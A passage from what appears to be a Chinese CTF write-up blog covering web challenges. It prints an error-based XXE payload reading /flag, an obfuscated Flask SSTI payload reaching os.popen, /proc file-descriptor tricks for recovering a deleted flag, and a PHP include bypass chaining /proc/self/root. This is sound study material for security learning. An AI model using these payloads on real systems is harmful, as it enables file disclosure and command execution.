<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677843256315-fb9ccbba-4bc7-4f63-8010-db4ee3b0c978.png#averageHue=%23f9f7f6&clientId=u00fa2a9f-efbd-4&from=paste&height=534&id=u13e81d58&name=image.png&originHeight=668&originWidth=1565&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126077&status=done&style=none&taskId=uc595c8ec-31eb-4ee2-b183-f973ef6d5ad&title=&width=1252" alt="image.png"><br>这次没报错，说明加载成功，只不过对于flag的内容，他的逻辑没匹配到结果而已<br>参考下列网址<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677843027629-d1077705-6e98-4049-8487-e9a8598e9738.png#averageHue=%23fbf9f8&clientId=u00fa2a9f-efbd-4&from=paste&height=562&id=u7ca4f35f&name=image.png&originHeight=702&originWidth=1815&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97532&status=done&style=none&taskId=ua741dc21-f742-4195-99a7-a3f8d1a464d&title=&width=1452" alt="image.png"><br>这是通常的做法，可以用这种报错信息带出来</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>妙啊<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677843646674-244a537e-2d5d-4d0e-8167-93d6c470b274.png#averageHue=%23f9f9f8&clientId=u00fa2a9f-efbd-4&from=paste&height=650&id=uae0cdf34&name=image.png&originHeight=813&originWidth=1400&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=118922&status=done&style=none&taskId=ub206816b-ce34-41db-a97a-8f08dd4a50d&title=&width=1120" alt="image.png"></p>
<h1 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h1><p>考点：SSTI，文件流风险<br>首先存在ssti，这边直接帖payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;((lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;))[&quot;\x5f\x5fbuiltins\x5f\x5f&quot;])[&quot;eval&quot;](&quot;\x5f\x5fimport\x5f\x5f(\&quot;os\&quot;)\x2epopen(\&quot;payload\&quot;)\x2eread()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>把payload部分换为指令，可以先读取源文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, render_template, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;folow @osminogka.ann on instagram =)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Tiaonmmn don&#x27;t remember to remove this part on deploy so nobody will solve that hehe</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def encode(line, key, key2):</span></span><br><span class="line"><span class="string">    return &#x27;&#x27;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.config[&#x27;flag&#x27;] = encode(&#x27;&#x27;, &#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;, &#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">line, key, key2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line">flag = flag[:<span class="number">42</span>]</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">nicknames = [<span class="string">&#x27;˜”*°★☆★_%s_★☆★°°*&#x27;</span>, <span class="string">&#x27;%s ~♡ⓛⓞⓥⓔ♡~&#x27;</span>, <span class="string">&#x27;%s Вêчңø в øĤлâйĤé&#x27;</span>, <span class="string">&#x27;♪ ♪ ♪ %s ♪ ♪ ♪ &#x27;</span>, <span class="string">&#x27;[♥♥♥%s♥♥♥]&#x27;</span>, <span class="string">&#x27;%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ&#x27;</span>, <span class="string">&#x27;♔%s♔&#x27;</span>, <span class="string">&#x27;[♂+♂=♥]%s[♂+♂=♥]&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = request.values.get(<span class="string">&#x27;nickname&#x27;</span>)</span><br><span class="line">            <span class="built_in">id</span> = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(nicknames) - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> p != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> p:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Your nickname contains restricted characters!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(nicknames[<span class="built_in">id</span>] % p)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Exception&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>
<p>一眼丁真看到没关闭文件里，读取proc目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 11:41 1</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:22 110</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:22 112</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:22 114</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:22 116</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:22 118</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:23 122</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:24 127</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:25 140</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:25 142</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:25 144</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:25 150</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:25 152</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:25 154</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:25 158</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:40 238</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:41 244</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:41 246</span><br><span class="line"># dr-xr-xr-x    9 root     root             0 Mar  3 12:41 256</span><br><span class="line"># drwxrwxrwt    2 root     root            40 Mar  3 11:41 acpi</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 buddyinfo</span><br><span class="line"># dr-xr-xr-x    4 root     root             0 Mar  3 11:41 bus</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 cgroups</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 cmdline</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 consoles</span><br><span class="line"># -r--r--r--    1 root     root         35448 Mar  3 12:41 cpuinfo</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 crypto</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 devices</span><br><span class="line"># -r--r--r--    1 root     root          1376 Mar  3 12:41 diskstats</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 dma</span><br><span class="line"># dr-xr-xr-x    3 root     root             0 Mar  3 12:41 driver</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 execdomains</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 filesystems</span><br><span class="line"># dr-xr-xr-x   10 root     root             0 Mar  3 11:41 fs</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 interrupts</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 iomem</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 ioports</span><br><span class="line"># dr-xr-xr-x  128 root     root             0 Mar  3 11:41 irq</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 kallsyms</span><br><span class="line"># crw-rw-rw-    1 root     root        1,   3 Mar  3 11:41 kcore</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 key-users</span><br><span class="line"># crw-rw-rw-    1 root     root        1,   3 Mar  3 11:41 keys</span><br><span class="line"># -r--------    1 root     root             0 Mar  3 12:41 kmsg</span><br><span class="line"># -r--------    1 root     root             0 Mar  3 12:41 kpagecgroup</span><br><span class="line"># -r--------    1 root     root             0 Mar  3 12:41 kpagecount</span><br><span class="line"># -r--------    1 root     root             0 Mar  3 12:41 kpageflags</span><br><span class="line"># -r--r--r--    1 root     root            30 Mar  3 12:41 loadavg</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 locks</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 mdstat</span><br><span class="line"># -r--r--r--    1 root     root          1391 Mar  3 12:41 meminfo</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 misc</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 modules</span><br><span class="line"># lrwxrwxrwx    1 root     root            11 Mar  3 11:44 mounts -&gt; self/mounts</span><br><span class="line"># -rw-r--r--    1 root     root             0 Mar  3 12:41 mtrr</span><br><span class="line"># lrwxrwxrwx    1 root     root             8 Mar  3 12:41 net -&gt; self/net</span><br><span class="line"># -r--------    1 root     root             0 Mar  3 12:41 pagetypeinfo</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 partitions</span><br><span class="line"># crw-rw-rw-    1 root     root        1,   3 Mar  3 11:41 sched_debug</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 schedstat</span><br><span class="line"># drwxrwxrwt    2 root     root            40 Mar  3 11:41 scsi</span><br><span class="line"># lrwxrwxrwx    1 root     root             0 Mar  3 11:41 self -&gt; 256</span><br><span class="line"># -r--------    1 root     root             0 Mar  3 12:41 slabinfo</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 softirqs</span><br><span class="line"># -r--r--r--    1 root     root          4421 Mar  3 12:41 stat</span><br><span class="line"># -r--r--r--    1 root     root            37 Mar  3 12:41 swaps</span><br><span class="line"># dr-xr-xr-x    1 root     root             0 Mar  3 11:41 sys</span><br><span class="line"># --w-------    1 root     root             0 Mar  3 11:41 sysrq-trigger</span><br><span class="line"># dr-xr-xr-x    5 root     root             0 Mar  3 12:41 sysvipc</span><br><span class="line"># lrwxrwxrwx    1 root     root             0 Mar  3 11:41 thread-self -&gt; 256/task/256</span><br><span class="line"># crw-rw-rw-    1 root     root        1,   3 Mar  3 11:41 timer_list</span><br><span class="line"># dr-xr-xr-x    6 root     root             0 Mar  3 12:41 tty</span><br><span class="line"># -r--r--r--    1 root     root            25 Mar  3 12:41 uptime</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 version</span><br><span class="line"># -r--------    1 root     root             0 Mar  3 12:41 vmallocinfo</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 vmstat</span><br><span class="line"># -r--r--r--    1 root     root             0 Mar  3 12:41 zoneinfo</span><br></pre></td></tr></table></figure>
<p>进入进程1的fd看看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># lrwx------    1 root     root            64 Mar  3 11:41 0 -&gt; /dev/null</span><br><span class="line"># l-wx------    1 root     root            64 Mar  3 11:41 1 -&gt; pipe:[2712835409]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 10 -&gt; pipe:[2714007556]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 11 -&gt; socket:[2713963999]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 12 -&gt; pipe:[2714007558]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 13 -&gt; socket:[2713964005]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 14 -&gt; pipe:[2713998550]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 15 -&gt; socket:[2714029103]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 16 -&gt; pipe:[2714001165]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 17 -&gt; socket:[2714070367]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 18 -&gt; socket:[2714070195]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 19 -&gt; pipe:[2714081757]</span><br><span class="line"># l-wx------    1 root     root            64 Mar  3 11:41 2 -&gt; pipe:[2712835410]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 20 -&gt; socket:[2714070372]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 21 -&gt; pipe:[2714025637]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 22 -&gt; pipe:[2714076465]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 23 -&gt; socket:[2714070373]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 24 -&gt; pipe:[2714079784]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 25 -&gt; socket:[2714070556]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 26 -&gt; pipe:[2714076890]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 27 -&gt; socket:[2714070558]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 28 -&gt; pipe:[2714087806]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 29 -&gt; socket:[2714070560]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 11:41 3 -&gt; /app/flag (deleted)</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 30 -&gt; pipe:[2714087808]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 31 -&gt; socket:[2714070885]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 32 -&gt; socket:[2714645866]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 33 -&gt; pipe:[2714626727]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 34 -&gt; pipe:[2714112428]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 35 -&gt; socket:[2714655786]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 36 -&gt; pipe:[2714626820]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 37 -&gt; socket:[2714655787]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 38 -&gt; pipe:[2714626822]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 39 -&gt; socket:[2714680882]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 11:41 4 -&gt; socket:[2712787512]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 40 -&gt; pipe:[2714673562]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 11:41 5 -&gt; socket:[2713963957]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 11:41 6 -&gt; pipe:[2714003456]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 11:41 7 -&gt; socket:[2713963963]</span><br><span class="line"># lr-x------    1 root     root            64 Mar  3 12:42 8 -&gt; pipe:[2714007554]</span><br><span class="line"># lrwx------    1 root     root            64 Mar  3 12:42 9 -&gt; socket:[2713963965]</span><br></pre></td></tr></table></figure>
<p>在3号位看到flag，一眼丁真直接读：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677847628595-208cdba0-d96c-4b1e-a378-54212beefb65.png#averageHue=%23f4edc0&clientId=u00fa2a9f-efbd-4&from=paste&height=146&id=u6c610a0c&name=image.png&originHeight=182&originWidth=921&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11614&status=done&style=none&taskId=ud4d605cb-86d4-49b7-9b40-5c936d66f94&title=&width=736.8" alt="image.png"></p>
<h1 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h1><p>考点：xpath注入<br>在XXE REMAKE之旅写了</p>
<h1 id="WMCTF2020-Make-PHP-Great-Again-2-0"><a href="#WMCTF2020-Make-PHP-Great-Again-2-0" class="headerlink" title="[WMCTF2020]Make PHP Great Again 2.0"></a>[WMCTF2020]Make PHP Great Again 2.0</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>[http://90cc792a-1f1d-4ade-8874-968d5fdb73ae.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php](http://90cc792a-1f1d-4ade-8874-968d5fdb73ae.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php)</code><br>和之前一样，只是解决了session的非预期</p>
<h1 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h1><p>考点：简单的flask session伪造<br>key在environ中</p>
<h1 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h1><p>考点：条件竞争，htaccess文件利用<br>不复现了</p>
<h1 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h1><p>考点：python代码审计</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 